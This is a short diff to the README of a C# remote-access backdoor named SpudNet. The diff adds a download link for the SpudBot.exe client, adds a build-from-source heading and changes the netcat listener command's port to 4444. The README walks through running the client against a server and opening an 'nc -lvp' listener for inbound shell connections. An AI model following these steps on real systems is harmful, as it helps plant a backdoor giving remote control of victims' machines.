@@ -10,7 +10,10 @@ A Potato-themed backdoor developed in C#.
 - A Windows client running SpudBot.exe.
 - A server listening for incomming connections. 
 
-## Installation
+## Download
+You can download the latest release of SpudBot.exe from https://github.com/malwaredetective/spudnet/releases/tag/v1.0.0. 
+
+## Building from Source Code
 - Clone a copy of the Github repository.
 ```
 git clone https://github.com/malwaredetective/spudnet.git
@@ -25,7 +28,7 @@ SpudBot.exe "Server" "Port"
 ```
 On the server, setup a listener to watch for inbound connections.
 ```
-nc -lvp 5370 -k
+nc -lvp 4444 -k
 ```
 The SpudNet framework contains built-in commands for the server to help *Spudify* the client.  
 
